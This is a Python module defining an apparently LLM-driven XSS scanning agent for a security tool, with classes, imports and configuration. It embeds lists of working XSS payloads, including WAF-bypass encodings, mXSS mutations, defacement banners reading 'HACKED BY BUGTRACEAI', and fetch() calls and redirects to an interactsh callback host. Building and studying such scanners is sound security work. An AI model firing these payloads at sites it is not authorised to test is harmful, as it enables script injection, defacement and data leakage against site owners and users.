"""
XSSAgent shell — canonical owner (P4-XSS-15).

Imperative composition of mixins + BaseAgent. Pure concerns live in sibling
package modules (types, policy, reflection, position, finding_builder, …).

Historical import path ``bugtrace.agents.xss_agent`` is a thin re-export of
this module. Prefer:

    from bugtrace.agents.xss import XSSAgent
"""

import asyncio
import aiohttp
import json
from typing import Dict, Iterable, List, NamedTuple, Optional, Any, Tuple, Union
from pathlib import Path
from dataclasses import dataclass, field, asdict, is_dataclass
from enum import Enum
from bisect import bisect_right
from functools import lru_cache
from operator import itemgetter as _itemgetter
import html as html_module
import re
import urllib.parse
from bugtrace.schemas.validation_feedback import ValidationFeedback, FailureReason

from bugtrace.utils.logger import get_logger
from bugtrace.core.config import settings
from bugtrace.core.llm_client import llm_client
from bugtrace.core.ui import dashboard
from bugtrace.core.http_manager import http_manager, ConnectionProfile
from bugtrace.tools.interactsh import InteractshClient
from bugtrace.tools.visual.verifier import XSSVerifier
from bugtrace.memory.payload_learner import PayloadLearner
from bugtrace.tools.external import external_tools
from bugtrace.tools.headless import detect_dom_xss, detect_dom_xss_batch

# Import worker pool for queue consumption (Phase 19)
from bugtrace.agents.worker_pool import WorkerPool, WorkerConfig
from bugtrace.core.queue import queue_manager
from bugtrace.core.event_bus import EventType
from bugtrace.core.verbose_events import create_emitter

# Import framework's WAF intelligence (Q-Learning based)
from bugtrace.tools.waf import waf_fingerprinter, strategy_router, encoding_techniques

# Import reporting standards for consistent output
from bugtrace.reporting.standards import (
    get_cwe_for_vuln,
    get_remediation_for_vuln,
    normalize_severity,
    get_default_severity,
)
from bugtrace.core.validation_status import ValidationStatus, requires_cdp_validation, get_validation_status

# v2.1.0: Import specialist utilities for payload loading from JSON
from bugtrace.agents.specialist_utils import load_full_payload_from_json, load_full_finding_data

# v3.2.0: Import TechContextMixin for context-aware XSS detection
from bugtrace.agents.mixins.tech_context import TechContextMixin
from bugtrace.agents.xss.hybrid_flow import XSSHybridFlowMixin
from bugtrace.agents.xss.pipeline_v2_flow import XSSPipelineV2Mixin
from bugtrace.agents.xss.escalation_flow import XSSEscalationMixin
from bugtrace.agents.xss.dom_stored_flow import XSSDomStoredFlowMixin
from bugtrace.agents.xss.payload_queue_flow import XSSPayloadQueueMixin
from bugtrace.agents.xss.discovery_run_flow import XSSDiscoveryRunMixin
from bugtrace.agents.xss.param_browser_flow import XSSParamBrowserMixin
from bugtrace.agents.xss.llm_misc_flow import XSSLlmMiscMixin
from bugtrace.agents.xss.thin_shell_flow import XSSThinShellMixin

# v3.1.0: Hybrid Engine imports (Go Fuzzer + Payload Amplification)
from bugtrace.utils.payload_amplifier import PayloadAmplifier
from bugtrace.tools.go_bridge import GoFuzzerBridge, FuzzResult, Reflection

# v3.3: ManipulatorOrchestrator for Python-only HTTP attack campaigns
from bugtrace.tools.manipulator.orchestrator import ManipulatorOrchestrator
from bugtrace.tools.manipulator.models import MutableRequest, MutationStrategy
# Context → breakout table lives in the manipulator (single source of truth); L3 reuses it
# instead of keeping a second copy of the same prefixes here.
from bugtrace.tools.manipulator.context_analyzer import ContextAnalyzer, ReflectionContext

# v3.4: Extracted pure modules
from bugtrace.agents.xss.waf import (
    detect_payload_encoding as _pure_detect_payload_encoding,
    record_bypass_result as _pure_record_bypass_result,
    get_waf_optimized_payloads as _pure_get_waf_optimized_payloads,
    bypass_try_waf_encoding as _pure_bypass_try_waf_encoding,
    bypass_try_char_obfuscation as _pure_bypass_try_char_obfuscation,
    bypass_try_context_specific as _pure_bypass_try_context_specific,
    bypass_try_universal_payloads as _pure_bypass_try_universal_payloads,
    generate_bypass_variant as _pure_generate_bypass_variant,
)
from bugtrace.agents.xss.feedback import (
    adapt_to_context as _pure_adapt_to_context,
    extract_js_code as _pure_extract_js_code,
    adapt_for_attribute as _pure_adapt_for_attribute,
    adapt_for_script as _pure_adapt_for_script,
    adapt_for_html as _pure_adapt_for_html,
    adapt_for_comment as _pure_adapt_for_comment,
    adapt_for_style as _pure_adapt_for_style,
    encode_stripped_chars as _pure_encode_stripped_chars,
    generate_csp_bypass_payload as _pure_generate_csp_bypass_payload,
    handle_waf_blocked as _pure_handle_waf_blocked,
    handle_context_mismatch as _pure_handle_context_mismatch,
    handle_encoding_stripped as _pure_handle_encoding_stripped,
    handle_partial_reflection as _pure_handle_partial_reflection,
    handle_csp_blocked as _pure_handle_csp_blocked,
    handle_timing_issue as _pure_handle_timing_issue,
    generate_variant_for_reason as _pure_generate_variant_for_reason,
)
from bugtrace.agents.xss import coverage as xss_coverage
from bugtrace.agents.xss.reporting import (
    get_snippet as _pure_get_snippet,
    save_phase1_report as _pure_save_phase1_report,
    save_phase2_report as _pure_save_phase2_report,
    save_phase3_report as _pure_save_phase3_report,
    save_phase4_report as _pure_save_phase4_report,
)
# P4-XSS-5: single type owner is package types (no dual class identity).
from bugtrace.agents.xss.types import (
    InjectionContext,
    ValidationMethod,
    XSSFinding,
)

from bugtrace.agents.xss.shell_constants import (
    _BROWSER_ONLY_CONTEXTS,
    _CDP_PROOF_LOCK,
    _L05_CHAR_PROBE,
    _LEGACY_PROBE_MARKER,
    _PROBE_NO_REFLECTION,
    _PROBE_NO_RESPONSE,
    _PROBE_REFLECTED,
    _REDIRECT_PARAM_SET,
    _REFLECTION_SNIPPET_RADIUS,
)

# Re-import HIGH_PRIORITY_PARAMS (and other constants) so attribute lookups
# like self.HIGH_PRIORITY_PARAMS resolve correctly in mixin methods.
from bugtrace.agents.xss.constants import (
    HIGH_PRIORITY_PARAMS,
    PROBE_STRING,
    PROBE_STRING_SAFE,
    OMNIPROBE_PAYLOAD,
    GOLDEN_PAYLOADS,
    FRAGMENT_PAYLOADS,
    MAX_BYPASS_ATTEMPTS,
    VISUAL_MARKER,
    VISUAL_MARKER_ELEMENT_ID,
    INTERACTSH_PLACEHOLDER,
    CONTEXT_TYPES,
)


# Reuse the OpenRedirect parameter vocabulary (DRY) so browser-only XSS — redirect/DOM-sink
# params like back=javascript:... that fire only on a real click — auto-escalate to the
# browser even at 'standard' scan depth.
from bugtrace.agents.openredirect_payloads import REDIRECT_PARAMS

logger = get_logger("agents.xss_v4")

# Serializes CDP-based proof-screenshot fallbacks. Chrome DevTools Protocol is
# single-threaded, so concurrent CDP captures across parallel XSS agents would
# contend; Playwright captures (the common, multi-threaded path) are unaffected.

# Browser-only XSS candidates can be confirmed ONLY in a real browser (a click / DOM
# execution), never by HTTP reflection — so they auto-escalate to L5/L6 regardless of scan
# depth. A redirect/DOM-sink parameter (value flows into an href/navigation) or a reflection
# that landed in one of these contexts qualifies.
# len>=3 drops noisy 1-2 char entries (u/r/l/q/to/go/rd) that would over-escalate common params.

# The historical hardcoded reflection marker. `_analyze_reflection_context()` searches for
# THIS string unless a caller passes an explicit `marker=`, because four of its six call
# sites pass a full PAYLOAD as `probe_prefix` — see the docstring there.

# How much HTML around the reflection point is handed to the L3 LLM prompt. A window, not a
# budget: too small and the model cannot see the enclosing tag, too large and it pays for
# unrelated markup. The L1 caller truncates the result again to its own limit.

# The L0.5 char-survival probe. Each special char is bracketed by its own marker pair so its
# survival is measured independently of the others. Module-level so the coverage record can
# state WHAT WAS SENT without the caller re-deriving (or drifting from) the literal.
# Format: BT7331A"BT7331B'BT7331C<BT7331D>BT7331E`BT7331F\BT7331G

# What the L0.5 probe observed. "no response" and "responded without the marker" are opposite
# facts — one is a broken/blocked target, the other is a parameter that is simply not
# injectable here — and reflects=False alone cannot tell them apart.


# Pure context-set normaliser: package owner is context_reflection.as_context_set.
from bugtrace.agents.xss.context_reflection import as_context_set as _as_context_set


# InjectionContext / ValidationMethod / XSSFinding: owned by bugtrace.agents.xss.types
# (re-exported above). Do not reintroduce dual class definitions here.


# --- Seed enrichment helpers: pure owner is finding_builder (thin adapters) ---
from bugtrace.agents.xss.finding_builder import (
    SENSITIVE_HEADERS as _SENSITIVE_HEADERS,
    mask_auth_headers as _mask_auth_headers,
    auth_meta as _auth_meta,
    excerpt_around as _excerpt_around,
    build_raw_http as _build_raw_http,
    promote_repro as _promote_repro,
)



# Reflection position / CSP pure block: package owner xss.position (P4-XSS-8).
# Reflection position / CSP pure block lives in xss.position (P4-XSS-8).
# Re-export the full module namespace so smoke_xss_context contracts and
# XSSAgent methods keep resolving symbols on this module.
import bugtrace.agents.xss.position as _xss_position  # noqa: E402

globals().update(
    {
        name: value
        for name, value in vars(_xss_position).items()
        if not name.startswith("__")
    }
)




# Breakout ranking pure block: package owner xss.breakouts (P4-XSS-9).
import bugtrace.agents.xss.breakouts as _xss_breakouts  # noqa: E402

globals().update(
    {
        name: value
        for name, value in vars(_xss_breakouts).items()
        if not name.startswith("__")
    }
)


from bugtrace.agents.base import BaseAgent

from bugtrace.agents.xss.agent_proof import XSSAgentProofMixin
from bugtrace.agents.xss.agent_encode import XSSAgentEncodeMixin
from bugtrace.agents.xss.agent_rest import XSSAgentRestMixin

class XSSAgent(XSSAgentProofMixin, XSSAgentEncodeMixin, XSSAgentRestMixin, XSSHybridFlowMixin, XSSPipelineV2Mixin, XSSEscalationMixin, XSSDomStoredFlowMixin, XSSPayloadQueueMixin, XSSDiscoveryRunMixin, XSSParamBrowserMixin, XSSLlmMiscMixin, XSSThinShellMixin, TechContextMixin, BaseAgent):
    """
    LLM-Driven XSS Agent with multi-layer validation.

    Flow:
    1. Register with Interactsh (get callback URL)
    2. Probe target to get HTML with reflection
    3. LLM analyzes HTML and generates optimal payload
    4. Send payload to target
    5. Validate via Interactsh (primary) or Vision/CDP (fallback)
    6. If failed, LLM generates bypass, repeat

    v3.2: Context-aware technology stack integration via TechContextMixin
    """
    
    MAX_BYPASS_ATTEMPTS = 6
    # Multi-stage probe pattern: Tests for characters: " < > &
    # Note: Single quote removed - it causes 500 errors on some servers (e.g., ginandjuice)
    # Single quote testing is done separately if needed
    # Note: CSTI detection is now handled by the dedicated CSTIAgent
    PROBE_STRING = "BT7331\"<>&"

    # Alternative probe for servers that error on double quotes
    PROBE_STRING_SAFE = "BT7331xss"

    # ====== OMNIPROBE: Reconnaissance payload for Phase 1 ======
    # Purpose: Detect reflection points and escaping behavior for XSS only
    # Tests: quotes, backslash-quotes, HTML tags, backticks
    # NO CSTI/SSTI templates - that's CSTIAgent's job
    # NO execution code - just probing what survives
    OMNIPROBE_PAYLOAD = "BT7331'\"<>`\\'\\\""

    # Elite payloads that bypass many WAFs - Pure XSS (CSTI now handled by CSTIAgent)
    GOLDEN_PAYLOADS = [
        # ====== CRITICAL: BACKSLASH-QUOTE BREAKOUTS (ginandjuice.shop killer) ======
        # These MUST be in top 20 to be tested. For JS contexts where server escapes \ to \\ but not quotes.
        # Input: \' → Server: \\' = escaped backslash + unescaped quote = BREAKOUT
        "\\';var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//",
        "\\';alert(document.domain)//",
        "\\\";var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//",
        "\\\";alert(document.domain)//",

        # ====== HIGH PRIORITY ELITE PAYLOADS (VISUAL + OOB) ======
    # THE OMNI-PROBE (User Inspired): XSS + CSTI + SSTI Polyglot
    "'\"><script id=bt-pwn>fetch('https://{{interactsh_url}}')</script>{{7*7}}${7*7}<% 7*7 %>",
    
    # Double Encoding with Visual Banner
        "%253Csvg%2520onload%253D%2522fetch%2528%2527https%253A%252F%252F{{interactsh_url}}%2527%2529%253Bvar%253Ddocument.createElement%2528%2527div%2527%2529%253Bb.id%253D%2527bt-pwn%2527%253Bb.style%253D%2527background%253Ared%253Bcolor%253Awhite%253Btext-align%253Acenter%253Bpadding%253A10px%253Bposition%253Afixed%253Btop%253A0%253Bleft%253A0%253Bwidth%253A100%2525%253Bz-index%253A9999%253Bfont-weight%253Abold%253B%2527%253Bb.innerText%253D%2527HACKED%2520BY%2520BUGTRACEAI%2527%253Bdocument.body.prepend%2528b%2529%253B%2522%253E",
        # THE LEVEL 9 KILLER: Double backslash + Visual Banner (avoiding 'on')
        "\\\");fetch('https://{{interactsh_url}}');(function(){var b=document.createElement('div');b.id='bt-pwn';b.style='background:red;color:white;text-align:center;padding:10px;position:fixed;top:0;left:0;width:100%;z-index:9999;font-weight:bold;';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);})();//",
        # Unicode breakout with Visual Banner
        "\\u0022);fetch('https://{{interactsh_url}}');var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);//",
        # Template literal with Visual Banner
        "\\`+fetch('https://{{interactsh_url}}')+(function(){var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);})()+\\`",
        
        # ====== CLASSIC & VISUAL PAYLOADS ======
        "\\\";var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);//", # Backslash Breakout Visual
        "\"><img src=x onerror=var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)>", # Attribute Breakout Visual
        "<svg/onload=var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)>", # SVG Visual
        "\"><svg/onload=var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)>", # SVG Attribute Breakout (Standard)
        "\"><svg/onload=document.body.appendChild(document.createElement('div')).id='bt-pwn'>", # SVG Zero-Space (Race.es Killer)
        "\"><svg/onload=fetch('https://{{interactsh_url}}')>", # SVG Space-less (Race.es Bypass)
        "\"><svg/onload=document.location='https://{{interactsh_url}}'>", # SVG Redirect (Race.es Aggressive)
        "\"><iframe src=javascript:alert(document.domain)>", # Iframe Protocol Bypass (Proven Winner)
        "';{const d=document.createElement('div');d.style='position:fixed;top:0;width:100%;background:red;color:white;text-align:center;z-index:9999;padding:10px;font-size:24px;font-weight:bold;';d.innerText='HACKED BY BUGTRACEAI';document.body.prepend(d)};//", # USER SUGGESTED VISUAL BREAKOUT
        "javascript:var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)//", # Protocol Visual
        "';var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);//", # Semicolon Breakout Visual
        "<details open ontoggle=fetch('https://{{interactsh_url}}')>"
        # NOTE: Backslash-quote breakouts moved to TOP of array for priority testing
    ]
    
    # Fragment-based payloads (DOM XSS via location.hash → innerHTML)
    # These bypass WAFs that filter query params but allow hash fragments
    FRAGMENT_PAYLOADS = [
        "<img src=x onerror=alert(document.domain)>", # Improved validation for Level 7
        "<img src=x onerror=fetch('https://{{interactsh_url}}')>",
        "<img src=x onerror=var b=document.createElement('div');b.id='bt-pwn';b.innerText='FRAGMENT XSS';document.body.prepend(b)>",
        "<svg/onload=fetch('https://{{interactsh_url}}')>",
        "<svg/onload=var b=document.createElement('div');b.id='bt-pwn';b.innerText='FRAGMENT XSS';document.body.prepend(b)>",
        "<iframe src=javascript:fetch('https://{{interactsh_url}}')>",
        "<details open ontoggle=fetch('https://{{interactsh_url}}')>",
        "<body onload=fetch('https://{{interactsh_url}}')>",
        "<marquee onstart=fetch('https://{{interactsh_url}}')>",
        # mXSS mutation payloads (Level 8)
        "<svg><style><img src=x onerror=alert(document.domain)>",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(document.domain)>\">",
        "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=</style><img src=x onerror=alert(document.domain)>",
    ]

    # L0.5 Smart context-specific payloads (NEVER alert(1) — always real impact)
    SMART_PAYLOADS = {
        "js_sq_breakout": "\\';document.title=document.domain//",
        "js_dq_breakout": "\\\";document.title=document.domain//",
        "html_svg": "<svg onload=document.title=document.domain>",
        "html_img": "<img src=x onerror=document.title=document.domain>",
        "attr_dq_breakout": "\" onmouseover=document.title=document.domain x=\"",
        "attr_sq_breakout": "' onmouseover=document.title=document.domain x='",
        # Tag-closing attribute breakouts: the '">' family. The "x=" variants above only
        # add an event handler to the HOST tag, which is useless inside a tag that never
        # fires one (<meta>, <link>, <input type=hidden>); closing the tag and injecting a
        # fresh one always executes.
        "attr_dq_tag_breakout": "\"><svg onload=document.title=document.domain>",
        "attr_sq_tag_breakout": "'><svg onload=document.title=document.domain>",
        "script_breakout": "</script><script>document.title=document.domain</script>",
    }

    def __init__(
        self,
        url: str,
        params: List[str] = None,
        report_dir: Path = None,
        headless: bool = True,
        event_bus: Any = None
    ):
        super().__init__("XSSAgentV4", "XSS Specialist (Phoenix Edition)", event_bus, agent_id="xss_agent_v4")
        self.url = url
        self.params = params or []
        self.report_dir = report_dir or Path("./reports")
        self.headless = headless

        # Load technology profile for context-aware exploitation
        from bugtrace.utils.tech_loader import load_tech_profile
        self.tech_profile = load_tech_profile(self.report_dir)

        # Tools
        self.interactsh: Optional[InteractshClient] = None
        # v3.2.1: CDP disabled - Playwright only (L3)
        # Flow: HTTP → Playwright (L3) → VALIDATED_CONFIRMED
        self.verifier = XSSVerifier(headless=headless, prefer_cdp=False)
        self.payload_learner = PayloadLearner()

        # NEGATIVE EVIDENCE: one closed record per parameter the escalation ladder touched,
        # so "tested hard, nothing executable" stops being indistinguishable from
        # "never tested". _xss_cov is the record currently open (None between parameters).
        self._xss_coverage: List[xss_coverage.ParamCoverage] = []
        self._xss_cov: Optional[xss_coverage.ParamCoverage] = None

        # Results
        self.findings: List[XSSFinding] = []
        self.interactsh = None
        
        # WAF AWARENESS & STEALTH (Now uses framework's Q-Learning WAF intelligence)
        self.consecutive_blocks = 0
        self.stealth_mode = False
        self.last_request_time = 0
        self._detected_waf: Optional[str] = None
        self._waf_confidence: float = 0.0

        # Deduplication (TASK-50: Thread-safe with lock)
        self._tested_params = set()
        self._tested_params_lock = asyncio.Lock()

        # Victory Hierarchy: Track if we achieved maximum impact
        self._max_impact_achieved = False

        # Queue consumption mode (Phase 19)
        self._queue_mode = False  # True when consuming from queue
        self._worker_pool: Optional[WorkerPool] = None
        self._scan_context: str = ""

        # Expert deduplication: Track emitted findings by fingerprint
        self._emitted_findings: set = set()  # (url, param, context)

        # Global XSS root cause deduplication: group DOM XSS by root cause
        self._global_xss_findings: Dict[tuple, List[str]] = {}  # root_cause_fingerprint -> [affected_urls]

        # WET → DRY transformation (Two-phase processing)
        self._dry_findings: List[Dict] = []  # Dedup'd findings after Phase A

        # v3.2.0: Context-aware tech stack (loaded in start_queue_consumer)
        self._tech_stack_context: Dict = {}
        self._xss_prime_directive: str = ""

        # v3.1.0: Hybrid Engine components
        self._go_bridge: Optional[GoFuzzerBridge] = None
        self._payload_amplifier: Optional[PayloadAmplifier] = None
        self._hybrid_mode: bool = True  # Enable hybrid engine by default


async def run_xss_scan(url: str, params: List[str] = None, report_dir: Path = None) -> Dict:
    """Run XSS scan on target URL."""
    agent = XSSAgent(url=url, params=params, report_dir=report_dir)
    return await agent.run()
